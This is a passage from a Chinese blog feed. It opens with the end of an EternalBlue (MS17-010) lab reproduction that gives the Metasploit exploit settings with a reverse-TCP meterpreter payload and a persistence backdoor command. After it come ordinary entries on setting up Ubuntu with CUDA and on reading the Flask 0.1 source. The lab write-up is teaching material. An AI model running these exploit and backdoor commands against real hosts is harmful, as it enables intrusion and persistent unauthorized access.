=&gt; 192.168.190.136</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.190.136:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.190.136:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>从上述结果可知：该win7存在漏洞</p><h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>执行如下指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure><p>第一行指令意思是加载Metasploit中的EternalBlue攻击模块，第四行是设置shell的通信类型，payload中装载的是漏洞利用成功后在目标机器上执行的代码</p><p>结果如下：</p><img src="/images/永恒之蓝漏洞复现1.PNG"><p>执行一下<code>shell</code>指令：</p><img src="/images/永恒之蓝漏洞复现2.PNG"><p>可以看到，我们已获得目标机器的最高权限的shell</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>metasploit自带的留后门方式有两种：metsvc和persistence，但都有弊端，官方都不推荐使用，这里使用persistence试下</p><p>执行如下指令即可在目标机器中留一个后门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -U -i 10 -p 4444 -r 192.168.190.135</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>-U：设置后门在用户登录后自启动。</li><li>-i：设置反向连接间隔时间，单位为秒。</li><li>-p：设置反向连接的端口号。</li><li>-r：设置反向连接的ip地址。</li></ul><p>之后可以使用handler模块进行连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure><hr><p>完</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的
      
    
    </summary>
    
      <category term="信息安全" scheme="https://mingliangliu.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="信息安全" scheme="https://mingliangliu.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>机器学习环境搭建</title>
    <link href="https://mingliangliu.com/2019/04/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://mingliangliu.com/2019/04/24/机器学习环境搭建/</id>
    <published>2019-04-24T15:12:07.000Z</published>
    <updated>2019-08-04T16:31:45.377Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇写于2019-4-25</p><p>这两天装Ubuntu18.04双系统简直装到崩溃。一是非常著名的开机卡死在Logo界面的问题，另一个是在装Nvidia驱动和CUDA的时候，更是费心。而网上的资料又良莠不齐，走了不少弯路。于是做个总结，方便以后的自己，也方便别人。</p><p>首先：我的机器是戴尔灵越5577，以下方案不一定适合您的机器，操作失败还请自行百度解决，并且安装所CUDA和cuDNN版本请务必参照<a href="https://tensorflow.google.cn/install/source" target="_blank" rel="noopener">官网配置</a></p><p>另外：安装过程中并没有保留截图，以下也只有文字叙述，有时间会补上。</p><h2 id="装机"><a href="#装机" class="headerlink" title="装机"></a>装机</h2><p>镜像是在Ububtu官网下载的镜像，这没有什么异议。启动盘制作方面我选择<a href="https://rufus.ie/" target="_blank" rel="noopener">rufus</a>，小巧免费好用，而且非常适合制作Linux启动盘。</p><p>选好U盘选好镜像后就可以制作了，我是选的默认设置，如下图。我也试过gpt格式的，均可。</p><img src="/images/rufus_en.png"><p>制作完成后，关闭rufus就可以了，带着U盘，重新启动。</p><p>进入U盘引导（不同品牌的电脑有不同的方式，Dell是按F12选择启动方式），进入grub界面。</p><p>你可能看过许多教程说的是，为防止开机开在Logo，选中Install Ubuntu，然后按e编辑。我的建议是先别这样做，因为编辑后进入的安装界面屏幕分辨率会很低，许多按钮在屏幕下方根本点不到，安装很不方便。这里我直接回车开始安装，至于会卡在logo这个问题，装好后再弄。</p><p>然后一步步安装就可以了。装的时候一定要注意：<strong>不要联网</strong>、<strong>不要选安装驱动啥的，最小化安装即可</strong>、<strong>手动分区</strong>。我的分区方式如下，共分给Linux 100G</p><table><thead><tr><th align="center">目录</th><th align="center">大小</th><th align="center"></th></tr></thead><tbody><tr><td align="center">/</td><td align="center">20G</td><td align="center">逻辑分区</td></tr><tr><td align="center">/boot</td><td align="center">1G</td><td align="center">逻辑分区</td></tr><tr><td align="center">/home</td><td align="center">69G</td><td align="center">逻辑分区</td></tr></tbody></table><p>装完后，会显示重新启动，如果点立即重启的话，不出意外，会卡在这里，没关系，按住电源键不放，强制关机。再开机后就可看到系统选择界面了。</p><p>这个时候不要着急选择，先选中Ubuntu，按e键进入编辑，将倒数第二段最后（可能是倒数第三行，不难分辨）的<code>quiet splash</code> 后加上<code>nomodeset</code>，注意<code>nomodeset</code>要和前后有一个空格。然后按F10，即可开机。</p><p>这时候，应该可以进入系统了，这个时候开始安装显卡驱动。</p><h2 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h2><p>这里有很多教程说是通过<code>sudo ubuntu-drivers autoinstall</code>这个方法安装的，但是就我亲身经历而言，并不好使，这里安装驱动是没问题的，但是后来在安装CUDA的时候会遇到各种各样的问题。</p><p>这里的建议是，去Nvidia的官网选择一个适合你的显卡的驱动（我选的最新的），下载好备用。</p><p>在装驱动之前，先将nouveau加入黑名单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>在末尾加上一行<code>blacklist nouveau</code></p><p>保存退出，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-initramfs -u</span><br></pre></td></tr></table></figure><p>另外：由于折腾的次数比较多我还改了<code>/etc/default/grub</code>，不知道和这有没有关系：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/default/grub</span><br></pre></td></tr></table></figure><p>然后将<code>quiet splash</code>后面加上<code>acpi_osi=linux</code></p><p>保存退出，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>接下来按CTRL+ALT+F2，进入纯字符界面，以root身份登入，开始安装显卡驱动。首先进入刚才下好的驱动所在的目录，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./NVIDIA-Linux-x86_64-xxx.xx.run –no-opengl-files  <span class="comment"># 一定不要忘记后面的参数</span></span><br></pre></td></tr></table></figure><p>然后一路确定，完成后重启系统，进入BIOS（戴尔是按F2，其他电脑型号请自行查找资料），<strong>关掉secure boot，设置为disable</strong>，关掉后保存重启。这里<strong>一定要关掉</strong>，不然开机后是没法用刚才装的Nvidia驱动的。</p><p>启动后在控制台输入<code>nvidia-smi</code>，若没有报错则证明安装成功。</p><h2 id="安装CUDA"><a href="#安装CUDA" class="headerlink" title="安装CUDA"></a>安装CUDA</h2><p>接下来，我们安装CUDA，我这里使用的是CUDA10.0，因为目前tensorflow已经可以使用CUDA10了，也就不挑旧版本安装了。</p><p>到Nvidai官网上找到CUDA10.0的下载链接，Nvidia给出的默认的CUDA的下载链接是CUDA10.1，因为我没试验过，所以不知道可不可以用，你可以自行决定。</p><p>依次选择 Linux -&gt; x86_64 -&gt; Ubuntu -&gt; 18.04 -&gt; runfile(local)，选好后选择Base Install开始下载。</p><p>下好后，找到CUDA安装包所在的位置，在控制台输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./cuda_10.0.130_410.48_linux.run</span><br></pre></td></tr></table></figure><p>然后等待一会后，会出来安装协议，按住空格键快速看完。然后选择安装选项：</p><ul><li>第一项，选择accept接受。</li><li>第二项，询问你是否安装CUDA中带的显卡驱动，由于我们前面已经安装了驱动，所以不安装，选n</li><li>剩下的，能选y的选y，能Enter的Enter就好。</li></ul><p>装好后，在~/.bashrc最后 添加环境变量，保存后退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:/usr/<span class="built_in">local</span>/cuda-10.0/lib64</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/cuda-10.0/bin</span><br><span class="line"><span class="built_in">export</span> CUDA_HOME=<span class="variable">$CUDA_HOME</span>:/usr/<span class="built_in">local</span>/cuda-10.0</span><br></pre></td></tr></table></figure><p>测试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/cuda/samples/1_Utilities/deviceQuery </span><br><span class="line">sudo make</span><br><span class="line">./deviceQuery</span><br></pre></td></tr></table></figure><p>若最后一行的结果为<code>Result = PASS</code>，说明安装成功。</p><h2 id="安装cuDNN"><a href="#安装cuDNN" class="headerlink" title="安装cuDNN"></a>安装cuDNN</h2><p>最后，去官网找对应版本的cuDNN，这里我选择的是7.5（7.4也是可以的），下载（这里需要登陆Nvidia才可以）</p><p>将下载好的压缩包解压，一般解压出来的目录为cuda，拷贝到CUDA中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp cuda/include/cudnn.h /usr/<span class="built_in">local</span>/cuda/include/ </span><br><span class="line">sudo cp cuda/lib64/libcudnn* /usr/<span class="built_in">local</span>/cuda/lib64/</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>至此，CUDA已安装完成，装个gpu版本的tensorflow试试（你也可以先使用virtualenv创建个虚拟环境再安装）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install tensorflow-gpu  <span class="comment"># 这里pip3需要手动下载</span></span><br></pre></td></tr></table></figure><p>装好后，进入python交互环境，试试<code>Hello World</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hello = tf.constant(<span class="string">'Hello World'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sess = tf.Session()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sess.run(hello)</span><br><span class="line"><span class="string">b'Hello World'</span></span><br></pre></td></tr></table></figure><p>执行后，会有日志打印，若没有报错，即证明安装成功。</p><hr><p>参考：</p><ul><li><a href="https://blog.csdn.net/qq_32408773/article/details/84111244" target="_blank" rel="noopener">https://blog.csdn.net/qq_32408773/article/details/84111244</a></li><li><a href="https://blog.csdn.net/u010801439/article/details/80483036" target="_blank" rel="noopener">https://blog.csdn.net/u010801439/article/details/80483036</a></li><li><a href="https://www.jianshu.com/p/6f54b4f96556" target="_blank" rel="noopener">https://www.jianshu.com/p/6f54b4f96556</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇写于2019-4-25&lt;/p&gt;
&lt;p&gt;这两天装Ubuntu18.04双系统简直装到崩溃。一是非常著名的开机卡死在Logo界面的问题，另一
      
    
    </summary>
    
      <category term="机器学习" scheme="https://mingliangliu.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="机器学习" scheme="https://mingliangliu.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Flask源码浅析</title>
    <link href="https://mingliangliu.com/2019/04/19/Flask%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/"/>
    <id>https://mingliangliu.com/2019/04/19/Flask源码浅析/</id>
    <published>2019-04-19T15:38:55.000Z</published>
    <updated>2019-08-04T16:31:45.328Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习一样东西，要先知其然，然后知其所以然。</p><p>这次，我们看看Flask Web框架的源码。我会以Flask 0.1的源码为例，把重点放在Flask如何处理请求上，看一看从一个请求到来到返回响应都经过了什么过程。</p><p>你可能会问，为什么以Flask 0.1为例啊，那都是好几年前的一坨老代码了？老，并不代表没有用。相反，Flask 0.1的源码设计极为精妙，包含了Flask的主干部分，整个项目只有一个文件，六百行左右，分析起来也简单，有利于我们了解整个Flask的脉络。你可以从<a href="https://github.com/pallets/flask/tree/0.1" target="_blank" rel="noopener">这里</a>来获取Flask 0.1的源码。</p><h2 id="Flask中定义的几个的类和函数"><a href="#Flask中定义的几个的类和函数" class="headerlink" title="Flask中定义的几个的类和函数"></a>Flask中定义的几个的类和函数</h2><p>在Flask 0.1的源码中，一共定义了五个类：</p><ol><li><code>Request</code>和<code>Response</code>, 它们分别是Flask的请求和响应对象，分别继承自Werkzeug中的请求和响应类</li><li><code>_RequestContext</code>，请求上下文类。它包含了所有请求的相关信息。包括程序实例app，url匹配器，请求对象，session对象，g对象以及用于记录闪现的消息的<code>flashes</code></li><li><code>_RequestGlobals</code>，使用该类创建g对象，这个对象内没有任何的属性，你可以给该类的实例（即g）绑定任何的全局属性。</li><li><code>Flask</code>，它是整个Flask框架的中心类，它实现了WSGI程序用于处理请求和响应，并且，它是整个所有视图函数、模板配置、URL规则的中心注册处。</li></ol><p>另外，Flask中还定义了一些函数：如<code>render_template</code>、 <code>url_for</code>、<code>flash</code>、<code>get_flashed_messages</code>等，相信大家都知道这些函数的作用，我就不在赘述。下面我们着重看看<code>Flask</code>类。</p><h2 id="Flask中本地上下文"><a href="#Flask中本地上下文" class="headerlink" title="Flask中本地上下文"></a>Flask中本地上下文</h2><p>在flask.py文件的最后，定义了几个全局对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_request_ctx_stack = LocalStack()</span><br><span class="line">current_app = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.app)</span><br><span class="line">request = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.request)</span><br><span class="line">session = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.session)</span><br><span class="line">g = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.g)</span><br></pre></td></tr></table></figure><p>其中，<code>_request_ctx_stack</code>是Flask的请求上下文堆栈，它的栈顶即是当前请求上下文对象的实例，当一个请求到来时，Flask会将一个请求上下文对象推入这个堆栈以便在程序中使用。<code>current_app</code>、<code>request</code>、<code>session</code>和<code>g</code>通过代理的方式从上下文堆栈中获取到所需要的值。如果你还不清楚<code>LocalStack</code>和<code>LocalProxy</code>，可以参见<a href="/2019/04/09/什么是Werkzeug/#more">什么时Werkzeug</a></p><h2 id="Flask类"><a href="#Flask类" class="headerlink" title="Flask类"></a>Flask类</h2><p>下面，我们重点看一下Flask类是如何定义的。</p><h3 id="从Flask类开头和-init-看起"><a href="#从Flask类开头和-init-看起" class="headerlink" title="从Flask类开头和__init__看起"></a>从Flask类开头和<code>__init__</code>看起</h3><p>在开始处，我们会看到Flask将<code>Request</code>和<code>Response</code>分别赋值给了<code>request_class</code>和<code>response_class</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request_class = Request</span><br><span class="line">response_class = Response</span><br></pre></td></tr></table></figure><p>Flask并没有在程序中直接使用<code>Request</code>和<code>Response</code>来生成请求和响应对象，而是通过调用<code>request_class</code>和<code>response_class</code>来生成，这就给我们自定义请求和响应类提供了方便。你可以通过继承Flask中的请求和响应类来构建自己的请求和响应类，并将它们赋值给<code>request_class</code>和<code>response_class</code>即可。</p><p>在下面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static_path = <span class="string">'/static'</span></span><br><span class="line">secret_key = <span class="keyword">None</span></span><br><span class="line">session_cookie_name = <span class="string">'session'</span></span><br></pre></td></tr></table></figure><p>我们可以看到在这里Flask定义了静态资源的目录，密钥以及cookie的名称，当然，这些你也可以手动进行修改。</p><p>下面，我们看一看<code>__init__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, package_name)</span>:</span></span><br><span class="line">    self.debug = <span class="keyword">False</span>  <span class="comment"># 是否开启调试</span></span><br><span class="line"></span><br><span class="line">    self.package_name = package_name</span><br><span class="line"></span><br><span class="line">    self.root_path = _get_package_path(self.package_name)  <span class="comment"># 程序的根目录</span></span><br><span class="line"></span><br><span class="line">    self.view_functions = &#123;&#125;  <span class="comment"># 用于保存注册的视图函数</span></span><br><span class="line"></span><br><span class="line">    self.error_handlers = &#123;&#125;  <span class="comment"># 保存注册的错误处理函数</span></span><br><span class="line"></span><br><span class="line">    self.before_request_funcs = []  <span class="comment"># 保存请求开始时前调用的函数</span></span><br><span class="line"></span><br><span class="line">    self.after_request_funcs = []  <span class="comment"># 保存请求完成后调用的函数</span></span><br><span class="line"></span><br><span class="line">    self.url_map = Map()  <span class="comment"># 保存路由规则</span></span><br></pre></td></tr></table></figure><p>可以看到，我们用字典来保存注册的视图函数和错误处理函数，以及用列表保存请求前后要掉用的函数。其中用一个<code>Map</code>对象<code>url_map</code>来保存我们对URL进行处理的路由规则，其中每个路由规则为一个<code>Rule</code>对象，我们会在下文看到。另外，<code>__init__</code>中还定义的用于保存模板函数的属性，以及Jinja2环境对象，这里不在一一列出。</p><h3 id="用于注册视图函数的装饰器"><a href="#用于注册视图函数的装饰器" class="headerlink" title="用于注册视图函数的装饰器"></a>用于注册视图函数的装饰器</h3><p>众所周知，我们可以使用下面的方式来注册视图函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World'</span></span><br></pre></td></tr></table></figure><p>我们看一下这个装饰器是如何实现的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">route</span><span class="params">(self, rule, **options)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(f)</span>:</span></span><br><span class="line">        self.add_url_rule(rule, f.__name__, **options)</span><br><span class="line">        self.view_functions[f.__name__] = f</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><p>在<code>route</code>中，会对我们传入的视图函数进行包装，首先调用Flask中的<code>add_url_rule</code>方法，然后以函数名为键，将视图函数保存在<code>__init__</code>中定义的用于保存视图函数的<code>view_functions</code>字典中。</p><p>下面，我们看看在<code>add_url_rule(rule, f.__name__, **options)</code>内部发生了什么：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_url_rule</span><span class="params">(self, rule, endpoint, **options)</span>:</span></span><br><span class="line">    options[<span class="string">'endpoint'</span>] = endpoint</span><br><span class="line">    options.setdefault(<span class="string">'methods'</span>, (<span class="string">'GET'</span>,))  <span class="comment">#  默认监听GET方法</span></span><br><span class="line">    self.url_map.add(Rule(rule, **options))</span><br></pre></td></tr></table></figure><p>在<code>add_url_rule</code>中，Flask首先将以<code>&#39;endpoint&#39;</code>为键，将端点值放入<code>options</code>中。如果<code>options</code>没有<code>&#39;methods&#39;</code>键，Flask会在这里给我们添加一个默认的GET方法，也就是说，当我们直接使用<code>@app.route(&#39;/&#39;)</code>，而不传入监听的方法时，Flask会默认监听GET方法。最后，Flask以当前的<code>rule</code>和<code>options</code>创建一个<code>Rule</code>对象放入到<code>url_map</code>中，为我们的程序新增了一条路由规则。</p><p>另外，除了<code>route</code>装饰器外，Flask中还有还提供了用于注册错误函数、请求前调用的函数、请求后调用的函数等的装饰器，这些装饰器和<code>route</code>装饰器基本相同，只是没有添加路由规则这个功能。例如请求处理前调用的函数的的装饰器:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">(self, f)</span>:</span></span><br><span class="line">    self.before_request_funcs.append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><h2 id="Flask请求响应流程"><a href="#Flask请求响应流程" class="headerlink" title="Flask请求响应流程"></a>Flask请求响应流程</h2><p>Flask中定义了<code>wsgi_app(self, environ, start_response)</code>方法作为WSGI的程序，它并没有写死在<code>__call__</code>方法中，因此可以为其添加中间件。当请求到来时，WSGI服务器会调用此方法，并将请求的参数和用于发起响应的函数作为参数传递给它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wsgi_app</span><span class="params">(self, environ, start_response)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> self.request_context(environ):</span><br><span class="line">        rv = self.preprocess_request()  <span class="comment"># 预处理请求</span></span><br><span class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            rv = self.dispatch_request()  <span class="comment"># 请求分发</span></span><br><span class="line">        response = self.make_response(rv)  <span class="comment"># 生成响应</span></span><br><span class="line">        response = self.process_response(response)  <span class="comment"># 响应处理</span></span><br><span class="line">        <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><p>Flask在<code>with</code>语句下执行相关操作，这会触发<code>_RequestContext</code>中的<code>__enter__</code>方法，从而推送请求上下文到堆栈中。在<code>with</code>中，Flask先通过<code>preprocess_request()</code>预处理请求，在<code>preprocess_request()</code>中调用所有在<code>beforce_request()</code>装饰器中注册的<strong>请求前要调用的函数</strong>。随后，Flask使用<code>dispatch_request()</code>来进行请求分发，获得视图函数的返回值或是错误处理器的返回值。然后Falsk将请求分发时获得的返回值传给<code>make_response()</code>方法来生成一个响应对象，接下来，Flask在<code>process_response()</code>方法中调用所有在<code>after_request()</code>装饰器中注册的<strong>请求完成后要调用的函数</strong>。最后，通过<code>response</code>来发起一个响应，这会自动调用<code>start_response</code>方法来发起响应并将响应的值返回给WSGI服务器。</p><h3 id="预处理请求"><a href="#预处理请求" class="headerlink" title="预处理请求"></a>预处理请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_request</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> func <span class="keyword">in</span> self.before_request_funcs:</span><br><span class="line">            rv = func()</span><br><span class="line">            <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure><p>上面的函数会在实际的请求分发之前调用，而且将会调用每一个使用<code>before_request()</code>装饰的函数。如果其中某一个函数返回一个值，这个值将会作为视图返回值处理并停止进一步的请求处理。</p><h3 id="请求分发"><a href="#请求分发" class="headerlink" title="请求分发"></a>请求分发</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch_request</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        endpoint, values = self.match_request()</span><br><span class="line">        <span class="keyword">return</span> self.view_functions[endpoint](**values)</span><br><span class="line">    <span class="keyword">except</span> HTTPException, e:</span><br><span class="line">        handler = self.error_handlers.get(e.code)</span><br><span class="line">        <span class="keyword">if</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line">        <span class="keyword">return</span> handler(e)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        handler = self.error_handlers.get(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">if</span> self.debug <span class="keyword">or</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">return</span> handler(e)</span><br></pre></td></tr></table></figure><p>在上面的方法中，Flask对URL进行匹配获取端点值和参数，然后调用相应的视图函数并将视图函数的返回值返回，或者返回相应的错误处理器的返回值。这里的返回值不一定是响应对象，比如我们可以在视图函数中返回一个字符串或者是使用<code>render_template()</code>渲染好的模板，所以，为了能够将返回值转换成合适的对象，我们需要<code>make_response()</code>方法来生成响应</p><h3 id="生成响应"><a href="#生成响应" class="headerlink" title="生成响应"></a>生成响应</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 